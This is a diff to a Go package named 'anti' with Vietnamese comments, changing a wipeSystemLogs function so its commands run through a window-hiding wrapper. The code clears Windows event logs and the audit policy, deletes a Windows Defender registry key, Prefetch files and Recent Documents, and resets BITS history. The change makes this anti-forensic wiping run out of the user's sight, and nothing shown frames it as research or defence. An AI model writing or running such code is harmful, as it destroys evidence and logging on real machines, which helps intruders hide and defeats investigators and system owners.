@@ -3,7 +3,6 @@
 package anti
 
 import (
-	"os/exec"
 	"strings"
 )
 
@@ -25,7 +24,7 @@ func wipeSystemLogs() []WipeStep {
 		"Setup", "ForwardedEvents", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational",
 		"Microsoft-Windows-WMI-Activity/Operational",
 		"Microsoft-Windows-Kernel-PnP/Diagnostic"} {
-		cmd := exec.Command("wevtutil", "cl", logName)
+		cmd := hideWindowCmd("wevtutil", "cl", logName)
 		out, err := cmd.CombinedOutput()
 		result := "OK"
 		detail := "Đã xóa event log " + logName
@@ -44,7 +43,7 @@ func wipeSystemLogs() []WipeStep {
 
 	// 2. Xoá log IIS, SMTP, etc. nếu có
 	for _, logName := range []string{"Microsoft-IIS-Logging/Logs", "SMTPSVC"} {
-		exec.Command("wevtutil", "cl", logName).Run()
+		hideWindowCmd("wevtutil", "cl", logName).Run()
 		steps = append(steps, WipeStep{
 			Category: "Logs",
 			Action:   "Clear Event Log",
@@ -55,7 +54,7 @@ func wipeSystemLogs() []WipeStep {
 	}
 
 	// 3. Vô hiệu hoá Audit Policy (cho các lần sau không ghi log)
-	exec.Command("auditpol", "/clear", "/all").Run()
+	hideWindowCmd("auditpol", "/clear", "/all").Run()
 	steps = append(steps, WipeStep{
 		Category: "Logs",
 		Action:   "Clear Audit Policy",
@@ -65,7 +64,7 @@ func wipeSystemLogs() []WipeStep {
 	})
 
 	// 4. Tắt Windows Defender sample submission history
-	_ = exec.Command("powershell", "-NoProfile", "-Command",
+	_ = hideWindowCmd("powershell", "-NoProfile", "-Command",
 		"Remove-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Spynet' -Recurse -Force -ErrorAction SilentlyContinue").Run()
 	steps = append(steps, WipeStep{
 		Category: "Logs",
@@ -76,7 +75,7 @@ func wipeSystemLogs() []WipeStep {
 	})
 
 	// 5. Xoá Prefetch (bản ghi ứng dụng từng chạy)
-	_ = exec.Command("cmd", "/C", "del", "/S", "/Q",
+	_ = hideWindowCmd("cmd", "/C", "del", "/S", "/Q",
 		`C:\Windows\Prefetch\*.pf`).Run()
 	steps = append(steps, WipeStep{
 		Category: "Logs",
@@ -87,7 +86,7 @@ func wipeSystemLogs() []WipeStep {
 	})
 
 	// 6. Xoá Recent Documents
-	_ = exec.Command("cmd", "/C", "del", "/S", "/Q",
+	_ = hideWindowCmd("cmd", "/C", "del", "/S", "/Q",
 		`%APPDATA%\Microsoft\Windows\Recent\*`).Run()
 	steps = append(steps, WipeStep{
 		Category: "Logs",
@@ -98,7 +97,7 @@ func wipeSystemLogs() []WipeStep {
 	})
 
 	// 7. Xoá BITS transfer history (file từng tải về qua BITS)
-	_ = exec.Command("bitsadmin", "/reset").Run()
+	_ = hideWindowCmd("bitsadmin", "/reset").Run()
 	steps = append(steps, WipeStep{
 		Category: "Logs",
 		Action:   "Reset BITS",
